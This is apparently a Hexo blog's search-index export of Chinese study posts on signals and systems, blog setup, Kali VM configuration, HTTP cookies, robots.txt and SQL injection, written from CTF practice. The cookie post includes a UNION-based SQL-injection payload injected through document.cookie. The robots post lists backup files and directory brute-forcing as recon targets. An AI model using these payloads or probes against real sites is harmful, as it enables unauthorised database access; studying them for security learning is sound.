{"pages":[],"posts":[{"title":"信号与系统学习笔记（一）","text":"摘要：信号与系统的一些概念理解 一、LTI系统时域分析 LTI系统定义:$$T(\\sum_{k=k_1}^{k_2} a_kx_k(t-t_k))= \\sum_{k=k_1}^{k_2} a_ky_k(t-t_k)$$ 卷积：设某系统冲激响应为$h(t)$,即$\\delta(t)\\Rightarrow h(t)$ $f(t)*T(\\delta(t))=T(f(t))$，看作f(t)经过了系统h(t),系统冲激响应为$T(\\delta(t))$。$u(t)$为$\\delta(t)$经过积分器 因果性：系统输出只与输入的当前值和以前值有关，充要条件$$h(t)=h(t)u(t)$$$$y(t)=\\int_0^\\infty h(\\tau)x(t-\\tau)d\\tau$$因$\\tau&gt;0$，所以$x(t-\\tau)$只用到了x(t)之前的值 记忆系统：输出与输入过去值有关 $x_1(t)=cosw_0t,x_2(t)=e^{-t},y_1(t)=x’(t),y_2(t)=x^2(t)$ 流图表示：子系统对调 二、LTI特征分析 CNN : $x[n]*h[-n]$,边缘补零，计算反向传播时可用卷积的思想 矩阵特征值与特征向量：$$A\\vec{x}=λ\\vec{x}$$把A看作某种对x的几何变换，若A对x有作用不变性，则x为A的特征向量，对应系数为特征值。 系统特征值与特征函数：$$T(s(u))=λs(u)$$s(u)/T可看作无穷维向量/矩阵 LTI系统特征值与特征函数：$$y(t)=e^{jwt}\\int_{-\\infty}^{\\infty} h(\\tau)e^{-jw\\tau}d\\tau=e^{jwt}H(w)$$$s(t)=e^{jwt}是任意LTI系统的特征函数，H(w)为对应系统的特征值$ 复指数表示$e^{jwt}$是真正的单频率信号，而cos和sin在频谱上都有两条谱线，所以只有傅里叶变换才能用于信号成分分析，才有明确的物理意义,是无可替代的。 $e^{st}$是一般意义的LTI特征函数，s=a+jw可表示任何复数，而傅里叶的s只能表示纯虚数(系数不同)，H(s)为特征值。是更复杂的信号，但不是有确定物理意义的单频信号，所以Laplace变换在做系统变换时比傅里叶变换有更广泛的性质，但不能用于信号成分分析。 三、傅里叶级数 $L^2[t_0,t_a]$上的完备正交基：$$f(t)=\\sum_{n=-\\infty}^{\\infty} c_n\\varphi_n(t)$$$$&lt;f(t),\\varphi_k(t)&gt;=\\sum_{n=-\\infty}^{\\infty} c_n&lt;\\varphi(t),\\varphi_k(t)&gt;=c_k&lt;\\varphi_k(t),\\varphi_k(t)&gt;$$ 三角形式傅里叶级数正交基：$$\\frac{1}{\\sqrt{2}},coswt,sinwt,…,cosnwt,sinnwt$$$$&lt;\\varphi_k(t),\\varphi_k(t)&gt;=\\frac{T}{2}$$ 指数形式傅里叶级数正交基：{e^{jnwt}}$$&lt;\\phi_n(t),\\phi_n(t)&gt;=&lt;e^{jnwt},e^{jnwt}&gt;=T$$ 周期延拓 四、傅里叶变换 加窗 $Sa(\\frac{wT}{2})=\\frac{sin\\frac{wT}{2}}{\\frac{wT}{2}}$主瓣是$\\frac{2\\pi}{T}$ –第一个过零点 峰值点在$w_0$和$-w_0$位置，可用于谱分析 局限：有限长的窗带来的频率分辨率问题 如果$\\frac{2\\pi}{T}&lt;&lt;w_0$,即矩形里包含了$cosw_0t$的很多周期，$T\\rightarrow\\infty$时Sa趋向冲击，没问题。但主瓣有宽度，如果信号有两个正弦分量$w_0$和$w_1$，如果$w_0$和$w_1$的距离小于主瓣宽度，两个Sa的主瓣会重合，叠加成一个Sa,可能只在$w_0$和$w_1$中间出现一个峰值，这时就无法分辨出两个频率。 为了解决这个问题，要求窗长尽可能大，分辨率才好。 周期信号的傅里叶变换 周期信号本来是没有傅里叶变换的,($f(t)\\notin L^1(-\\infty,\\infty)$)。但可以通过主周期得到主周期的傅里叶变换，再得到F级数的系数与主周期的F变换的关系，从而得到完整周期的F变换。其傅里叶变换是一系列冲激串。 –F级数是F变换的特例 只有有限长信号或其延拓成的周期信号才有傅里叶级数，$F_n$表明在某个频点有确定的信号强度，信号强度的密度对应着冲激，即傅里叶变换。 高斯对高斯，冲激对冲激 五、离散信号傅里叶变换 离散信号的频率在离散信号中，w和$w+2\\pi k$不可区分，因为只看离散点n(整数)的值而非连续的t，如$sin((2\\pi k+w)n+\\phi)=sin(wn+\\phi)$。所以角频率主值取$[-\\pi,\\pi]$或$[0,2\\pi]$ 注意，在离散信号中，$\\pi$为最高频，0和$2\\pi$为最低频。(0和$2\\pi$不可区分) 正弦离散信号的周期$x[n]=cos(w_0n+\\phi)$,令$x[n+N]=x[n]$，则周期$N=\\frac{2\\pi}{w_0}k$,k取令N为整数的最小整数 注意：角频率越大，周期越小的结论不再成立 以N为周期的离散信号中，可区分的正弦频率数目只有N个 $$w_k=\\frac{2\\pi}{N}k,k=0,1,…,N-1$$ 离散信号的傅里叶级数DFS DTFT","link":"/2022/04/05/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"如何个性化定制个人博客","text":"摘要：一篇基于yarn,Hexo和Icarus主题的个性化定制个人博客的教程。以如何把Hexo默认主题更改为酷炫的赛博朋克风格为例，介绍了一些Icarus主题的功能强大的插件 前言搭建完博客后，可以定制个人的博客风格。本文将基于Icarus主题搭建赛博朋克风格的博客。 1.安装和配置必要依赖yarn安装直接使用npm命令即可，这样的前提是你已经安装了 Node.js 12node-v #检查是否具有node.jsnpm install -g yarn #安装yarn 安装完成之后可以通过yarn -v命令检测是否安装成功。然后我们设置一下yarn库的镜像源： 1yarn config set npmRegistryServer https://registry.npm.taobao.org 2.更换为 Icarus 主题我们查看 Icarus 文档,里面有英文文档也有中文文档。更换主题主要有两种方式，一种是使用 npm 安装主题的方式，另一种是下载源码放到 theme 文件夹的方式。简单起见，我们采用 npm 的方式： 1yarn add hexo-theme-icarus 使用 hexo 命令修改主题为 Icarus: 1npx hexo config theme icarus hexo g生成后，本地调试下，报错： 提示缺少依赖，就按照指示按照依赖： 1yarn add bulma-stylus@0.8.0 hexo-pagination@^2.0.0 hexo-renderer-inferno@^0.1.3 再次生成并本地调试，成功出现 Icarus 主题要更换为赛博朋克风格主题，只需在Hexo文件夹的_config.icarus.yml修改 12# Icarus theme variant, can be &quot;default&quot; or &quot;cyberpunk&quot;variant: cyberpunk 再次生成并本地调试，成功出现赛博朋克主题，用hexo d上传至服务器 3.自定义配置修改配置文件 _config.yml 和 _config.icarus.yml ，配置网站相关信息。主要包括 logo、favicon、navbar 的 menu 和 links、footer、donates、widgets。可参照Icarus用户指南 - 主题配置 widgets即为左侧和右侧的挂件，profile widgets是个人资料卡，里面的social_links的icon是基于fontawesome的。subscribe_email、adsense 都用不上，可以删掉。 Icarus还提供了分享和评论插件。设置参照Icarus用户指南 - 分享按钮和Icarus用户指南 - 用户评论插件,效果如下： 注意：评论插件需在github上创建一个新的repo来放置，且配置完成后要在个人主页上登录github进行初始化评论。 Icarus支持数学公式显示，只需在主题配置文件下修改； 12mathjax: enable: true 若无法显示，可能是没安装hexo-math： 1npm install hexo-math --save 4.配置样例文章注意头部配置文件相关信息，在新版 Icarus 中头图需要额外配置 cover 选项，如下： 1234567891011121314---title: 如何个性化个人博客date: 2022-04-08 23:05:51categories:- CS- Blogtags:- Hexo- Icarus- Blogtoc: truethumbnail: 'https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220409013048.png' # 缩略图cover: 'https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs20220409013048.png' # 头图--- 5.主页展示文章缩略首页应该展示更多的文章，我们想让用户在主页看文章缩略内容，只需用markdown在文章的md文件中添加 即可，文章会自动从插入的位置截断，也就是说在博客中只显示之前的内容。 添加完之后，会出现“阅读更多”的按钮。 6.怎么样让文章两栏展示为了有效利用空间，希望文章页能够不同于主页的三栏布局，使用两栏布局。或者想在文章页面使用不同于主页的挂件。此时我们需要在_config.yml同级文件夹添加 _config.post.yml 文件，参照配置文件与优先级 配置成两栏布局： 123456789101112widgets: - # Where should the widget be placed, left sidebar or right sidebar position: right type: toc # Whether to show the index of each heading index: false # Whether to collapse sub-headings when they are out-of-view collapsed: true # Maximum level of headings to show (1-6) depth: 3 7.部署到 GitHub Pages 上参照官网描述,在上一篇文章中已经部署。 注意在 _config.yml 中配置你的 GitHub Pages 对应的仓库地址，如： 1234deploy: type: git repository: git@github.com:zhangsx19/zhangsx19.github.io.git branch: master 总结Icarus 主题提供了丰富且功能强大的插件，能让我们实现炫酷的主题，从而个性化定制个人博客。 参考资料 Yarn 的安装与使用 轻松搭建赛博朋克风格个人博客 —— Hexo 篇｜技术点评","link":"/2022/04/08/%E5%A6%82%E4%BD%95%E4%B8%AA%E6%80%A7%E5%8C%96%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"title":"用HEXO从零开始搭建个人博客","text":"摘要：一篇如何使用Github Pages和Hexo搭建自己的个人博客的教程，里面介绍了如何使用和配置Hexo框架，如何将Hexo部署到自己的Github项目中，如何注册域名以及将自己的域名关联到Github Pages上。 前言一直想搭建一个属于自己的博客，一方面可以记录自己的学习成果和技术理解，一方面在面试中也是加分项。在此记录下首次搭建个人博客的踩坑之路。 一、技术选型1.为什么选择HEXO？博客生成技术分为静态和动态网站生成，考虑到静态相比动态生成，有如下优点： 1.内容存储为平面文件，因此不需要数据库 2.静态网站不需要动态服务器端处理 3.静态网站比动态网站超快，因为它们不需要服务器端处理或数据库访问 4.静态网站比任何动态网站都更安全，因为可以利用的安全漏洞更少 5.缓存静态文件比缓存动态页面更有效 所以本次使用静态生成，目前主流静态站点生成器有：Hexo和Hugo等，Hugo是一个用Go语言构建的静态站点生成器，其搭建较简单但可扩展性差。而Hexo是基于Node的开源静态生成器，有以下优点： 1.构建速度快 2.使用一个部署命令可部署到Github或其他任何主机 3.强大的Markdown支持 4.高度可扩展 5.丰富的开源主题与插件 基于此，本次采用Hexo进行博客搭建。 2.为什么选择Github-PagesGithub Pages是用户编写的、托管在github上的静态网页,优点有：1.可以绑定你的域名2.简单快捷，可以提供一个免费的服务器，免去了自己搭建服务器和写数据库的麻烦。 二、搭建步骤1.安装和配置必要框架Git安装去Git官网根据你的电脑参数，下载对应版本并安装。安装完成后在桌面或任意文件夹点击鼠标右键，会有Git GUI Here和Git Bash Here两个按钮，一个是图形界面的Git操作，一个是命令行。一般选择命令行操作Git Bash Here。 Node.js安装到官网根据电脑参数下载安装文件并执行，无脑点下一步即可，无需配置环境变量，完成安装。 Hexo安装与配置桌面右键鼠标，点击Git Bash Here，输入以下命令即可安装。 12npm install hexo-cli -g npm install hexo-deployer-git --save 第一句是安装hexo，第二句是安装hexo部署到git page的deployer，两个都需要安装。如下图即安装完成。 安装完成后，根据自己喜好创建一个Hexo文件夹(如D:\\Blog\\Hexo),进入创建的文件夹目录，右键鼠标，点击Git Bash Here，执行命令: 1hexo init Hexo 将在指定文件夹中新建所需要的初始化配置文件，如下图 123hexo clean #清理缓存hexo generate #进行渲染 简写为 hexo ghexo server #部署到本地(调试使用) 简写为 hexo s 终端中会出现INFO Hexo is running at http://localhost:4000/。此时在浏览器输入网址http://localhost:4000，即可查看本地的效果，如下图 此时个人博客初步创建成功，但这是本地调试用的，其他人看不到(调试完毕后记得在git命令行中Ctrl+C来停止运行，不然下次就进不去了)，所以接下来我们需要把它部署到服务器上，从而让每个人都能通过互联网访问到我们的个人博客。 2.将博客部署到Github-Pages上在Github中创建github.io项目代码库注意repository的名字必须是：你的用户名.github.io 将本地的Hexo文件更新到Github的库中打开创建的Hexo文件夹，修改配置文件_config.yml以后的大部分操作都会在_config.yml中进行，它是站点的配置文件。在Hexo文件夹下,右键鼠标，点击Git Bash Here,执行命令： 1234hexo clean #清理缓存hexo generate #进行渲染 简写为 hexo ghexo server #部署到本地 简写为 hexo s 可省略hexo deploy #部署到git服务器 简写为 hexo d 以上代码为了简单后续统称为“更新代码”，即每次在本地进行了操作（如修改了配置、新写或修改了博客文章等),都需执行“更新代码”来同步到git服务器，从而让别人浏览到。其中hexo s命令也可省略，即如果没有本地调试需求，可以直接commit到git服务器。如报错ERROR Deployer not found: git,deployer没有安装成功，需要执行如下命令再安装一次： 1npm install hexo-deployer-git --save 再执行hexo g -d，出现INFO Deploy done: git即部署成功，在浏览器上输入Github Pager为我们生成的外链：你的用户名.github.io（如zhangsx19.github.io），即可看到自己的博客，且每个人都可通过此地址访问到。 三、写第一个博客搭好博客后，进入创建的Hexo文件夹，使用如下命令来新建文章： 1hexo new post “文章名字” #简写为 hexo n &quot;文章名字&quot; 建立好的文章存储在./source/_posts 中，你可以在本地用markdown语法编辑内容。编辑完成后还需要执行“更新代码” 123hexo cleanhexo ghexo d #可与hexo g合并为 hexo d -g 再刷新浏览器就可看到新文章。如下图: 四、将域名关联到Github Pages(可选）1.域名购买如果不想用github提供的免费域名，可以选择在阿里云上买一个属于自己的域名，然后将自己域名绑定到自己的Github Pages博客上 2.域名解析购买域名并实名认证后，需要把域名解析到我们的博客中，在阿里云的域名控制台找到域名右侧对应的解析按钮。点击添加解析，然后按照如下填写添加解析，记得把记录值替换成你自己的博客地址。 之后记得启用该记录。 3.博客配置购买域名后，在Hexo\\source 文件夹下创建文件 CNAME （通过记事本创建和打开，没有后缀名），内容为你的域名，如sx-zhang.top。 然后在Hexo文件夹执行“更新代码”。 12hexo cleanhexo g -d 就可以通过购买的域名访问博客了。如果不能访问可能是因为运营商DNS缓存问题。等几分钟就可以。 五、实现https协议(可选）购买的域名是http协议，如果用google浏览器或者Safari，会提示网站不被信任，只有你点击仍要继续才会展示你的博客。而使用https协议就不会有这个问题，有以下方法： 购买证书 使用免费CA证书。腾讯云阿里云都有提供。不过有时间限制 使用CDN进行反向代理 因为我们使用的github Page是不支持上传证书的，所以此次使用第三种:通过CDN配置反向代理。 原理Cloudflare 提供DNS解析服务，而且速度很快。它提供了免费的https服务(但不是应用SSL证书)。实现模式是，用户到CDN服务器的连接为https，而CDN服务器到GithubPage服务器的连接为http，即在CDN服务器那里加上反向代理。 步骤去官网注册后添加购买的域名，进入DNS解析界面填入如下解析： 其中前两个是使你的域名指向github的服务器地址(github文档中给的)，最后CNAME记录指向的是github仓库域名username.github.io。一定要严格按照这个来配置。记录下cloudflare给你的DNS解析服务器，就在上一步那个页面下边，用这个记录去把阿里云的DNS解析服务器替换掉，同时删掉阿里云里面的DNS解析记录，因为只靠clouleflare来解析DNS。 回到clouldflare上面选择SSL/TLS的Overview选项，然后选择Full或者是Flexible。再在Edge Certificates里打开always use HTTPS开关。此时即可用https访问个人博客啦！ 坑点：博文不能有非https的链接，比如图片图床不能是https的，或者评论插件不支持https等 总结本文简单介绍了如何用Hexo框架从零开始搭建属于自己的个人博客，以及如何把购买的域名关联到Github Pages,并利用CDN配置反向代理实现https协议。搭建完博客后，接下来就是要个性化个人博客和学习Markdown来写博客了。 想了解更多，欢迎来参观我的博客：Zhangsx’s Blog 和github：zhangsx19 参考资料 hexo搭建博客以及域名解析分析 2018，你该搭建自己的博客了！ 关于HEXO搭建个人博客的点点滴滴","link":"/2022/04/04/%E7%94%A8HEXO%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"},{"title":"kali虚拟机安装与配置","text":"摘要：本文实现了利用虚拟机从零开始安装和配置kali系统 一.安装和配置必要依赖1、VMWARE每个虚拟机都有独立的CMOS、硬盘和操作系统，可以像使用实体机一样对虚拟机进行操作。在安装时，勾选增强型如果是第一次安装，启动的时候会要求打开虚拟化的设置。可参照启动BIOS的虚拟化设置 网络1234vmnet1是为host-only方式服务的，vmnet8是为NAT方式服务的。使用Host-Only模式的guest系统与主机通信需要VMnet1网卡通过NAT方式上网的guest系统与主机通信需要VMnet8网卡使用桥接模式上网需要网络中存在DHCP服务器，且提供服务。 如果发现ping不通，很可能是windows开了防火墙(公用) 123仅主机模式：本机与新安装的虚拟机互通，但是虚拟机与其他的虚拟机互通不了。NAT模式：本机与新安装的虚拟机互通，虚拟机与虚拟机之间也互通，但是外界访问不了你。桥接模式：本机与新安装的虚拟机互通，虚拟机与虚拟机之间也互通，外界也能访问你这个虚拟机。(直接连接物理网络) 快照快照是虚拟机最强大的功能，能够让你保留虚拟电脑的某一时刻。 –&gt; 存档的意思 查看-立即适应客户机如果没有说明要安装vmware tools，直接在虚拟机按钮处安装 建立共享文件夹注意必须先在kali中设置好，再在vm里设置共享文件夹，否则会被删掉 远程连接首先要开启允许远程控制(Kali不像windows,默认是没有远程桌面服务的,如果需要的话得自己安装)，然后在主机运行栏输入mstsc，输入虚拟机ipv4地址(ipconfig查看,kali是ifconfig)。windows:网络右键-&gt;映射网络驱动器 2.Kalikali就是用工具对目标进行渗透测试的。下载地址,推荐下载Kali Linux 64-Bit VMware VM(这个版本是专门用于Vmware)。(网页查找VMWARE即可)。解压后找到vmx文件用虚拟机打开。可以选择编辑虚拟机设置。打开后选择我已移动该虚拟机(点复制有些工具可能会路径错误)。开机输入默认的账户和密码，都为kali（2021.1以后和之前的老版本不同，只是一个普通用户,老版本为root用户，账户和密码均为root）如何删除虚拟机：选中要删除的虚拟机操作系统，单击右键，选择 “管理” 选项。然后在选择 “从磁盘中删除” 选项即可删除该虚拟机操作系统 二、设置root用户这里我们可以直接更改root用户的密码，后续就可以用root用户登陆了切换到root权限：sudo su打开终端，输入命令：sudo passwd root提示输入kali用户的密码，kali的默认密码为kali。接下来输入新密码，输入两遍新密码之后，root用户的密码成功修改。接下来可以重启kali 用root用户登录，并且输入上面步骤的新密码。重启命令：sudo reboot 三、设置中文（1）设置中文编码命令：dpkg-reconfigure locales 进入选择语言的图形化界面之后，（空格是选择，Tab是切换）选中 en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8、zh_CN.GBK，图为初始界面，界面下选项，可以下拉，排序为从a-z排序。回车之后，会让你设置默认编码，设置成zh_CN.UTF-8，回车。注意：重启后要选择保留旧的名称，方便以后的配置。 （2）配置源不然下载软件的时候会比较慢，源可以理解为软件的仓库做一下备份：sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup,如果以后源列表无意毁坏了，可以恢复一下:sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list打开源文件：vim /etc/apt/sources.list。此时文件里面只有一个官方源，建议注释，不然还是会使用这个源。vi和vim都是Linux中的编辑器，vi使用于文本编辑,但是vim适用于coding和文本。 推荐源： 12345# kali官方源deb http://http.kali.org/ moto main non-free contribdeb-src http://http.kali.org/ moto main non-free contribdeb http://security.kali.org/ moto/updates main contrib non-freedeb-src http://security.kali.org/ moto/updates main contrib non-free 接着更新源，命令： 12345apt-get update #更新一下源sudo apt-get dist-upgrade -y #更新系统和软件#这里最好快照一下sudo apt-get autoremove -y #清理安装包reboot #重启 更新源时，如果出现以下错误，换个源如果中间出错了，会提示执行apt --fix-broken install,再执行即可。更新好就会有这个，选择yes （3）安装中文输入法命令：apt-get install fcitx fcitx.googlepinyin,重启后在搜索框搜索“fcitx”,点击“fcitx配置”程序，将Google输入法调在第一位即可切换：ctrl+空格 （4）安装中文字体如果使用chrome浏览器,发现中文显示全是方框。而系统自带的firefox却没有这个问题,原因是系统缺少相应的字体库支持命令：sudo apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy安装完后输入sudo reboot重启，记得在登陆界面选择中文，再登陆,则汉化完成。 5）浏览器改为中文kali默认浏览器是网络浏览器，点击search for more languages;select a language to add,找到Chinese(China),点击add。 6）浏览器安装插件在扩展和主题里，安装omega代理插件，应用选项如下 三、安装JDK1.8并且切换(不一定要切换)kali默认的java版本是，版本过高不太稳定，较稳定的版本是JDK1.8。先把包拖进虚拟机 12解压安装包：tar -axvf jdk-8u311-linux-x64.tar.gz将文件移动到opt目录再改名为java：mv ./jdk1.8.0_311 /opt/java 编辑：vi /etc/profile export JAVA_HOME=/opt/java export PATH=$PATH:$JAVA_HOME/bin export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export JRE_HOME=$JAVA_HOME/jre 1234567更新：source /etc/profile更新完后会出现#,关掉终端，再打开一个命令行切换：update-alternatives --install /usr/bin/java java /opt/java/bin/java 3update-alternatives --config java #切换回去也是这条命令选择1java -version #查看版本 四、踩过的坑1.更新时卡住了，只能退出重来，结果提示12E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it? 这些错误提示一般都是因为某些程序在系统后台进行着某些 apt 操作，因此锁定了 apt 数据库，所以暂时不能进行 apt 操作。遇到这种情况，一般我们只需要安静地等待几分钟。直到当前的更新、安装或卸载任务完成后，锁就会自动释放，然后就可以进行 apt 操作了。非正常情况下，比方说你等了好多个几分钟锁都还没有被释放，你就要看看是不是该进程由于某些原因而卡住了并且一直占用着锁。如果是的话，那你只能干掉这个进程，然后删除该锁定了首先，我们先找出是哪个进程占用了锁文件 /var/lib/dpkg/lock 1sudo lsof /var/lib/dpkg/lock-frontend #sudo lsof 文件 我们可以从结果中看到，该进程的 PID 为 1548。接着，kill 掉这个进程 1sudo kill -9 1548 然后你就可以放心地删除锁文件 123sudo rm /var/lib/dpkg/locksudo rm /var/cache/apt/archives/lock #删除缓存目录下的锁文件sudo dpkg --configure -a 2.更新源时release仓库过期首先确保虚拟机与主机的时间是同步的(虚拟机-设置-选项-VMWARE TOOLS)，如果还是不行，可能是长时间挂着虚拟机，时间不同步了，只需重启下即可 总结经历千辛万苦终于安装和配置成功，接下来开始学习了。 参考资料1.kali2021.4软件更新以及输入法安装2.更新卡住解决_Linux安装软件时90%的人会遇到这个报错，如何解决？","link":"/2022/04/10/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"},{"title":"http中的cookie","text":"摘要：本文介绍了http中的cookie是什么 前言做XCTF时遇到了cookie,特此记录。 零、http和https协议1.静态Web和动态Web的区别输入，静态Web常用来阅读资料的，而动态Web可以根据【用户输入内容】的不同返回不同的结果。（交互式的） 2.前后端交流过程当我们输入完域名的时候，浏览器会拿着我们的域名向服务器发起一个请求，服务器拿到这个请求之后，会返回一个响应，浏览器拿到响应之后就会渲染一个页面。 3.Web攻击面Network（网络层）、OS（操作系统）、Web Server（中间件）、App Server（app之类的漏洞）、Web Application（网站）、Database（数据库方面的漏洞）、Browser（浏览器方面的漏洞） 4.HTTP和HTTPS的区别12HTTP：①.无状态。②.明文传输HTTPS = HTTP +SSL：最大的区别就是加密 5.加密123对称加密：同一种加密方式，同一种解密方式非对称加密：加密方式是一种，解密方式是另外一种。公钥加密，私钥解密 客户端与服务器端通信的加密过程：当我们输入完域名的时候，浏览器会拿着我们的域名向服务器发起一个请求，再发起请求之前，服务器端会先发送一个公钥给客户端，浏览器会拿到这个公钥根据自己的算法去生成一个对称密钥，接下来客户端与服务器端之间的通信数据都会被对称密钥进行加密，然后对称密钥会被公钥进行加密，一起发送给服务器端，服务器端收到了请求后，首先会拿私钥把对称密钥进行解密，得到了对称密钥再对传输的数据进行解密。 一、cookie的定义Cookie，有时也用其复数形式 Cookies。Cookie是由服务器端生成，发送给User-Agent,浏览器会将Cookie的key/value保存到某个目录下的文本文件内，如网站根目录下的cookie.php,下次请求同一网站时就发送该Cookie给服务器 一句话，cookie=用户身份 二、cookie的作用HTTP cookie就是服务器端发送给浏览器端的一小部分数据，浏览器接收到这个数据之后，可以存起来自己用，也可以在后续发送到server端进行一些数据的校验。 Cookie诞生的最初目的是为了存储web中的状态信息，以方便服务器端使用。比如判断用户是否是第一次访问网站。 又如通过在cookies中存储一些有用的数据，可以将无状态的HTTP协议变成有状态的session连接，或者用来保存登录的权限，下次不用密码即可登陆，非常有用。一般来说，cookies用在三个方面： 123- session的管理，用来保存登录状态，从而让HTTP请求可以带上状态信息。- 用户自定义的设置，这些用户特殊的字段，需要保存在cookies中。- 跟踪用户的行为信息。 在很久很久以前，还没有现代浏览器的时候，客户端的唯一存储就是cookies，所以cookies也作为客户端存储来使用的，但是有了现代的浏览器之后，一般是建议把客户端存储的数据放到其他存储方式中。为什么呢？因为每次请求cookies中的数据会自动带上，并且发送到server端，所以如果cookies中存储了太多的数据，就会导致服务器性能的下降。 三、cookie注入当你使用Cookie进行传参的时候 ，传参的值一定要进行URL编码的。默认浏览器是会URL编码的。 空格–&gt; %20 如果用的数据库是ACCESS，语法比较正规(select后一定要有from即要先找到一个表名)b9a2a2b5dffb918c -&gt; md5解码-&gt; welcome 12escape() # 函数，作用：进行URL编码document.cookie = &quot;id=&quot; + escape(&quot;171 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin&quot;) 四、解题 总结学习了http中的cookies 参考资料 HTTP系列之:HTTP中的cookies 好好了解一下Cookie(强烈推荐)","link":"/2022/04/09/http%E4%B8%AD%E7%9A%84cookie%E4%B8%8Ecookie%E6%B3%A8%E5%85%A5/"},{"title":"Robots协议是什么","text":"摘要：本文介绍了Robots协议是什么，以及如何利用urllib的robotparser模块，实现网站Robots协议的分析 前言做XCTF时遇到了Robots协议,特此记录。 一、前置内容1.区分进程和线程进程是cpu资源分配的最小单位（是能拥有资源和独立运行的最小单位） 线程是cpu调度的最小单位（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）。单线程与多线程，都是指在一个进程内的单和多。 12345- 进程是一个工厂，工厂有它的独立资源- 工厂之间相互独立- 线程是工厂中的工人，多个工人协作完成任务- 工厂内有一个或多个工人- 工人之间共享空间 12345- 工厂的资源 -&gt; 系统分配的内存（独立的一块内存）- 工厂之间的相互独立 -&gt; 进程之间相互独立- 多个工人协作完成任务 -&gt; 多个线程在进程中协作完成任务- 工厂内有一个或多个工人 -&gt; 一个进程由一个或多个线程组成- 工人之间共享空间 -&gt; 同一进程下的各个线程之间共享程序的内存空间（包括代码段、数据集、堆等） 2.浏览器是多进程的浏览器之所以能够运行，是因为系统给它的进程分配了资源（cpu、内存） 简单点理解，每打开一个Tab页，就相当于创建了一个独立的浏览器进程。如果再多打开一个Tab页，进程正常会+1以上 注意：在这里浏览器应该也有自己的优化机制，有时候打开多个tab页后，可以在Chrome任务管理器中看到，有些进程被合并了 （所以每一个Tab标签对应一个进程并不一定是绝对的） 3.浏览器有哪些进程1234-浏览器主进程：只有一个，主要控制页面的创建、销毁、网络资源管理、下载等。-浏览器渲染进程(浏览器内核)：每个Tab页对应一个进程，互不影响。-第三方插件进程：每一种类型的插件对应一个进程，仅当使用该插件时才创建。-GPU进程：最多一个，用于3D绘制等。 4.输入网址并解析这里我们只考虑输入的是一个URL结构字符串，如果是非 URL 结构的字符串，则会用浏览器默认的搜索引擎搜索该字符串。 输入URL后，浏览器会解析出协议、主机、端口、路径等信息，并构造一个HTTP请求。(两次命中看缓存) 123-浏览器发送请求前，根据请求头的expires和cache-control判断是否命中（包括是否过期）强缓存策略，如果命中，直接从缓存获取资源，并不会发送请求。如果没有命中，则进入下一步。-没有命中强缓存规则，浏览器会发送请求，根据请求头的If-Modified-Since和If-None-Match判断是否命中协商缓存，如果命中，直接从缓存获取资源。如果没有命中，则进入下一步。-如果前两步都没有命中，则直接从服务端获取资源。 5.HSTS由于安全隐患，会使用 HSTS 强制客户端使用 HTTPS 访问页面。详见：你所不知道的 HSTS。当你的网站均采用 HTTPS，并符合它的安全规范，就可以申请加入 HSTS 列表，之后用户不加 HTTPS 协议再去访问你的网站，浏览器都会定向到 HTTPS。无论匹配到没有，都要开始 DNS 查询工作了。 6.DNS域名解析在发起http请求之前，浏览器首先要做去获得我们想访问网页的IP地址，(如百度的IP是202.108.22.5，在浏览器中输入https://baidu.com和http://202.108.22.5是等价的）浏览器会发送一个UDP的包给DNS域名解析服务器 7.备份文件名常用的备份文件名有.git,.svn,.swp,.~,.bak,.bash_history 二、robots协议Robots协议也称作爬虫协议、机器人协议，它的全名叫作网络爬虫排除标准（Robots Exclusion Protocol），用来告诉爬虫和搜索引擎哪些页面可以抓取，哪些不可以抓取。它通常是一个叫作robots.txt的文本文件，一般放在网站的根目录下。 当搜索爬虫访问一个站点时，它首先会检查这个站点根目录下是否存在robots.txt文件，如果存在，搜索爬虫会根据其中定义的爬取范围来爬取。如果没有找到这个文件，搜索爬虫便会访问所有没有被口令保护的页面。 如下是一个robots.txt的样例： 123User-agent: *Disallow: /Allow: /public/ 上面的User-agent描述了搜索爬虫的名称，这里将其设置为*则代表该协议对任何爬取爬虫有效。 Disallow指定了不允许抓取的目录，比如上例子中设置为/则代表不允许抓取所有页面。 三、robotparser以简书为例，首先创建RobotFileParser对象，然后通过set_url()方法设置了robots.txt的链接。接着利用can_fetch()方法判断了网页是否可以被抓取。 12345from urllib.robotparser import RobotFileParserrp = RobotFileParser()rp.set_url('http://www.jianshu.com/robots.txt')rp.read()print(rp.can_fetch('*', 'http://www.jianshu.com/search?q=python&amp;page=1&amp;type=collections')) 四、解题1.思路1 2.思路2利用direarch目录扫描工具暴力破解，扫到有robots.txt总结学习了robots协议和python爬虫的robotparser类。 参考资料 从输入URL开始建立前端知识体系 【Python3网络爬虫开发实战】3.1.4-分析Robots协议 从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理","link":"/2022/04/09/Robots%E5%8D%8F%E8%AE%AE%E6%98%AF%E4%BB%80%E4%B9%88/"},{"title":"sql注入和sqlmap","text":"摘要：本文介绍了sql注入的原理和常用的开源自动化sql注入工具–sqlmap 前言sql注入是最常用的注入手段，被称为漏洞之王，是学习web安全不可或缺的。 一.sql注入原理1.什么是sql注入什么是注入？一句话定义：把用户输入的数据当做代码执行 sql注入；用户在网页输入的内容被浏览器当做数据库语句进行执行。 